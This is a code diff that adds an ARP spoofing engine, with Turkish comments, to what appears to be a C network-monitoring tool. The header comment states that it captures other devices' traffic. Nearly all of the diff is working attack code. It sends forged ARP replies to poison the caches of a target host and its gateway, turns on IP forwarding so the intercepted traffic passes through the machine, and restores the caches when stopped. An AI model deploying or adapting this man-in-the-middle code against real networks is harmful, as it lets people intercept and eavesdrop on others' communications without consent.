@@ -19,6 +19,10 @@
 #include <netinet/udp.h>
 #include <netinet/if_ether.h>
 #include <arpa/inet.h>
+#include <net/if_arp.h>
+#include <netpacket/packet.h>
+#include <net/ethernet.h>
+#include <fcntl.h>
 #endif
 
 #ifdef PLATFORM_WINDOWS
@@ -1456,3 +1460,352 @@ void full_monitor_get_stats(FullStats *s) {
     *s = stats;
     platform_mutex_unlock(&global_lock);
 }
+
+/* ==================================================================
+ *   ARP SPOOF ENGINE — Ağdaki diğer cihazların trafiğini yakalamak için
+ *   MITM (Man-in-the-Middle) ARP zehirleme motoru.
+ *
+ *   Çalışma prensibi:
+ *   1. Hedef cihaza "gateway'in MAC'i benim MAC'im" der
+ *   2. Gateway'e "hedef cihazın MAC'i benim MAC'im" der
+ *   3. IP forwarding açılır, trafik bizden geçer
+ *   4. pcap zaten promiscuous modda çalıştığı için bu trafiği yakalar
+ * ================================================================== */
+
+#ifdef PLATFORM_LINUX
+
+/* ARP spoof state */
+static int g_arp_spoof_running = 0;
+static platform_thread_t g_arp_thread;
+static unsigned char g_gateway_mac[6];
+static unsigned char g_target_mac[6];
+static unsigned char g_my_mac[6];
+static char g_spoof_target_ip[MAX_IP_LEN] = {0};
+static char g_spoof_gateway_ip[MAX_IP_LEN] = {0};
+static char g_spoof_iface[MAX_IFACE_LEN] = {0};
+static volatile int g_arp_raw_fd = -1;
+static int g_ip_forward_original = -1;
+
+/* --- Yardımcı: Kendi MAC adresimizi al --- */
+static int spoof_get_own_mac(const char *iface, unsigned char *mac) {
+    struct ifreq ifr;
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) return -1;
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
+    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+    close(fd);
+    return 0;
+}
+
+/* --- Yardımcı: Kendi IP adresimizi al --- */
+static int spoof_get_own_ip(const char *iface, char *ip_out, int ip_len) {
+    struct ifreq ifr;
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) return -1;
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+    ifr.ifr_addr.sa_family = AF_INET;
+    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return -1; }
+    struct sockaddr_in *sa = (struct sockaddr_in *)&ifr.ifr_addr;
+    strncpy(ip_out, inet_ntoa(sa->sin_addr), ip_len - 1);
+    close(fd);
+    return 0;
+}
+
+/* --- ARP resolve: Bir IP'nin MAC adresini bul --- */
+static int arp_resolve_mac(const char *ip, unsigned char *mac_out, const char *iface) {
+    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (fd < 0) {
+        fprintf(stderr, "[ARP_SPOOF] Raw socket acilamadi (root/cap_net_raw gerekli)\n");
+        return -1;
+    }
+
+    unsigned int ifindex = if_nametoindex(iface);
+    if (ifindex == 0) { close(fd); return -1; }
+
+    struct sockaddr_ll addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sll_family   = AF_PACKET;
+    addr.sll_ifindex  = ifindex;
+    addr.sll_protocol = htons(ETH_P_ARP);
+
+    /* Kendi MAC ve IP */
+    unsigned char own_mac[6];
+    char own_ip[16] = {0};
+    if (spoof_get_own_mac(iface, own_mac) < 0) { close(fd); return -1; }
+    if (spoof_get_own_ip(iface, own_ip, sizeof(own_ip)) < 0) { close(fd); return -1; }
+
+    /* ARP Request paketi oluştur (Ethernet header + ARP header = 42 bytes) */
+    unsigned char buf[64];
+    memset(buf, 0, sizeof(buf));
+
+    /* Ethernet header */
+    memset(buf, 0xff, 6);                   /* dst: broadcast */
+    memcpy(buf + 6, own_mac, 6);            /* src: bizim MAC */
+    buf[12] = 0x08; buf[13] = 0x06;         /* EtherType: ARP */
+
+    /* ARP header */
+    buf[14] = 0x00; buf[15] = 0x01;         /* Hardware type: Ethernet */
+    buf[16] = 0x08; buf[17] = 0x00;         /* Protocol type: IPv4 */
+    buf[18] = 0x06;                          /* Hardware address length */
+    buf[19] = 0x04;                          /* Protocol address length */
+    buf[20] = 0x00; buf[21] = 0x01;         /* Opcode: ARP Request */
+
+    memcpy(buf + 22, own_mac, 6);            /* Sender MAC */
+    struct in_addr src_in;
+    inet_pton(AF_INET, own_ip, &src_in);
+    memcpy(buf + 28, &src_in, 4);            /* Sender IP */
+
+    memset(buf + 32, 0x00, 6);               /* Target MAC: unknown */
+    struct in_addr dst_in;
+    inet_pton(AF_INET, ip, &dst_in);
+    memcpy(buf + 38, &dst_in, 4);            /* Target IP */
+
+    /* Gönder */
+    if (sendto(fd, buf, 42, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        close(fd);
+        return -1;
+    }
+
+    /* Yanıt bekle (timeout 3 sn) */
+    struct timeval tv = {3, 0};
+    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    unsigned char resp[128];
+    int result = -1;
+    for (int attempt = 0; attempt < 100; attempt++) {
+        int n = recvfrom(fd, resp, sizeof(resp), 0, NULL, NULL);
+        if (n <= 0) break;
+        if (n < 42) continue;
+
+        /* ARP Reply mi? */
+        int arp_opcode = (resp[20] << 8) | resp[21];
+        if (arp_opcode != 2) continue;
+
+        /* Doğru IP'den mi geliyor? */
+        char resp_ip[16];
+        snprintf(resp_ip, sizeof(resp_ip), "%d.%d.%d.%d",
+                 resp[28], resp[29], resp[30], resp[31]);
+        if (strcmp(resp_ip, ip) == 0) {
+            memcpy(mac_out, resp + 22, 6);  /* Sender MAC */
+            result = 0;
+            break;
+        }
+    }
+    close(fd);
+    return result;
+}
+
+/* --- Sahte ARP Reply gönder --- */
+static void send_arp_reply(int raw_fd, const char *iface,
+                           const unsigned char *src_mac, const char *src_ip,
+                           const unsigned char *dst_mac, const char *dst_ip) {
+    unsigned char buf[42];
+    memset(buf, 0, sizeof(buf));
+
+    /* Ethernet header */
+    memcpy(buf, dst_mac, 6);                 /* dst MAC */
+    memcpy(buf + 6, src_mac, 6);             /* src MAC (bizim MAC) */
+    buf[12] = 0x08; buf[13] = 0x06;         /* EtherType: ARP */
+
+    /* ARP Reply */
+    buf[14] = 0x00; buf[15] = 0x01;         /* Hardware: Ethernet */
+    buf[16] = 0x08; buf[17] = 0x00;         /* Protocol: IPv4 */
+    buf[18] = 0x06; buf[19] = 0x04;         /* Lengths */
+    buf[20] = 0x00; buf[21] = 0x02;         /* Opcode: Reply */
+
+    memcpy(buf + 22, src_mac, 6);            /* Sender MAC (bizim MAC) */
+    struct in_addr sin;
+    inet_pton(AF_INET, src_ip, &sin);
+    memcpy(buf + 28, &sin, 4);               /* Sender IP (sahte — gateway veya hedef IP) */
+
+    memcpy(buf + 32, dst_mac, 6);            /* Target MAC */
+    inet_pton(AF_INET, dst_ip, &sin);
+    memcpy(buf + 38, &sin, 4);               /* Target IP */
+
+    struct sockaddr_ll addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sll_family   = AF_PACKET;
+    addr.sll_ifindex  = if_nametoindex(iface);
+    addr.sll_protocol = htons(ETH_P_ARP);
+    memcpy(addr.sll_addr, dst_mac, 6);
+    addr.sll_halen    = 6;
+
+    sendto(raw_fd, buf, 42, 0, (struct sockaddr *)&addr, sizeof(addr));
+}
+
+/* --- ARP Spoof döngüsü (ayrı thread) --- */
+static void *arp_spoof_loop(void *arg) {
+    (void)arg;
+
+    int raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (raw_fd < 0) {
+        fprintf(stderr, "[ARP_SPOOF] Raw socket acilamadi\n");
+        g_arp_spoof_running = 0;
+        return NULL;
+    }
+    g_arp_raw_fd = raw_fd;
+
+    /* Gateway MAC'ini çöz */
+    fprintf(stderr, "[ARP_SPOOF] Gateway MAC cozuluyor: %s\n", g_spoof_gateway_ip);
+    if (arp_resolve_mac(g_spoof_gateway_ip, g_gateway_mac, g_spoof_iface) < 0) {
+        fprintf(stderr, "[ARP_SPOOF] Gateway MAC bulunamadi: %s\n", g_spoof_gateway_ip);
+        close(raw_fd);
+        g_arp_raw_fd = -1;
+        g_arp_spoof_running = 0;
+        return NULL;
+    }
+    fprintf(stderr, "[ARP_SPOOF] Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+            g_gateway_mac[0], g_gateway_mac[1], g_gateway_mac[2],
+            g_gateway_mac[3], g_gateway_mac[4], g_gateway_mac[5]);
+
+    /* Hedef cihaz MAC'ini çöz */
+    fprintf(stderr, "[ARP_SPOOF] Hedef MAC cozuluyor: %s\n", g_spoof_target_ip);
+    if (arp_resolve_mac(g_spoof_target_ip, g_target_mac, g_spoof_iface) < 0) {
+        fprintf(stderr, "[ARP_SPOOF] Hedef MAC bulunamadi: %s\n", g_spoof_target_ip);
+        close(raw_fd);
+        g_arp_raw_fd = -1;
+        g_arp_spoof_running = 0;
+        return NULL;
+    }
+    fprintf(stderr, "[ARP_SPOOF] Hedef MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+            g_target_mac[0], g_target_mac[1], g_target_mac[2],
+            g_target_mac[3], g_target_mac[4], g_target_mac[5]);
+
+    /* Kendi MAC'imizi al */
+    spoof_get_own_mac(g_spoof_iface, g_my_mac);
+
+    fprintf(stderr, "[ARP_SPOOF] Baslatildi: %s <-> %s (iface: %s)\n",
+            g_spoof_target_ip, g_spoof_gateway_ip, g_spoof_iface);
+
+    while (g_arp_spoof_running) {
+        /* Hedefe söyle: "Gateway benim" */
+        send_arp_reply(raw_fd, g_spoof_iface,
+                       g_my_mac, g_spoof_gateway_ip,      /* src: bizim MAC, gateway IP */
+                       g_target_mac, g_spoof_target_ip);   /* dst: hedef MAC, hedef IP */
+
+        /* Gateway'e söyle: "Hedef benim" */
+        send_arp_reply(raw_fd, g_spoof_iface,
+                       g_my_mac, g_spoof_target_ip,        /* src: bizim MAC, hedef IP */
+                       g_gateway_mac, g_spoof_gateway_ip); /* dst: gateway MAC, gateway IP */
+
+        /* 2 saniyede bir tekrarla (ARP cache yenileme) */
+        for (int i = 0; i < 20 && g_arp_spoof_running; i++)
+            platform_sleep_ms(100);
+    }
+
+    /* ===== TEMİZLİK: Gerçek ARP bilgilerini geri yükle ===== */
+    fprintf(stderr, "[ARP_SPOOF] ARP cache geri yukleniyor...\n");
+
+    /* Hedefe gerçek gateway MAC'ini gönder */
+    send_arp_reply(raw_fd, g_spoof_iface,
+                   g_gateway_mac, g_spoof_gateway_ip,
+                   g_target_mac, g_spoof_target_ip);
+
+    /* Gateway'e gerçek hedef MAC'ini gönder */
+    send_arp_reply(raw_fd, g_spoof_iface,
+                   g_target_mac, g_spoof_target_ip,
+                   g_gateway_mac, g_spoof_gateway_ip);
+
+    /* Birkaç kere daha gönder (güvenilirlik) */
+    for (int r = 0; r < 3; r++) {
+        platform_sleep_ms(200);
+        send_arp_reply(raw_fd, g_spoof_iface,
+                       g_gateway_mac, g_spoof_gateway_ip,
+                       g_target_mac, g_spoof_target_ip);
+        send_arp_reply(raw_fd, g_spoof_iface,
+                       g_target_mac, g_spoof_target_ip,
+                       g_gateway_mac, g_spoof_gateway_ip);
+    }
+
+    close(raw_fd);
+    g_arp_raw_fd = -1;
+    fprintf(stderr, "[ARP_SPOOF] Durduruldu, ARP cache temizlendi.\n");
+    return NULL;
+}
+
+/* --- IP Forwarding aç/kapa (/proc/sys/net/ipv4/ip_forward) --- */
+void enable_ip_forward(void) {
+    /* Eski değeri sakla */
+    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "r");
+    if (f) {
+        if (fscanf(f, "%d", &g_ip_forward_original) != 1)
+            g_ip_forward_original = 0;
+        fclose(f);
+    }
+    /* Aç */
+    f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
+    if (f) {
+        fprintf(f, "1");
+        fclose(f);
+        fprintf(stderr, "[ARP_SPOOF] IP forwarding acildi (onceki: %d)\n", g_ip_forward_original);
+    } else {
+        fprintf(stderr, "[ARP_SPOOF] IP forwarding acilamadi (root gerekli)\n");
+    }
+}
+
+void disable_ip_forward(void) {
+    /* Eski değere geri dön */
+    int val = (g_ip_forward_original > 0) ? 1 : 0;
+    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
+    if (f) {
+        fprintf(f, "%d", val);
+        fclose(f);
+        fprintf(stderr, "[ARP_SPOOF] IP forwarding eski degerine donduruldu: %d\n", val);
+    }
+}
+
+/* --- Public API --- */
+void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *iface) {
+    if (g_arp_spoof_running) return;
+    if (!target_ip || !gateway_ip || !iface) return;
+
+    strncpy(g_spoof_target_ip, target_ip, sizeof(g_spoof_target_ip) - 1);
+    strncpy(g_spoof_gateway_ip, gateway_ip, sizeof(g_spoof_gateway_ip) - 1);
+    strncpy(g_spoof_iface, iface, sizeof(g_spoof_iface) - 1);
+
+    /* IP forwarding aç (yoksa MITM paketleri düşer) */
+    enable_ip_forward();
+
+    g_arp_spoof_running = 1;
+    platform_thread_create(&g_arp_thread, arp_spoof_loop, NULL);
+    platform_thread_detach(g_arp_thread);
+}
+
+void arp_spoof_stop(void) {
+    if (!g_arp_spoof_running) return;
+    g_arp_spoof_running = 0;
+
+    /* Thread'in temizlik yapması için bekle */
+    platform_sleep_ms(1500);
+
+    /* IP forwarding'i eski haline getir */
+    disable_ip_forward();
+
+    g_spoof_target_ip[0] = '\0';
+    fprintf(stderr, "[ARP_SPOOF] Tamamen durduruldu.\n");
+}
+
+int arp_spoof_is_running(void) {
+    return g_arp_spoof_running;
+}
+
+const char *arp_spoof_get_target(void) {
+    return g_spoof_target_ip;
+}
+
+#else /* PLATFORM_WINDOWS — stub */
+
+void enable_ip_forward(void) {}
+void disable_ip_forward(void) {}
+void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *iface) {
+    (void)target_ip; (void)gateway_ip; (void)iface;
+    fprintf(stderr, "[ARP_SPOOF] Windows'da desteklenmiyor.\n");
+}
+void arp_spoof_stop(void) {}
+int  arp_spoof_is_running(void) { return 0; }
+const char *arp_spoof_get_target(void) { return ""; }
+
+#endif /* PLATFORM_LINUX */
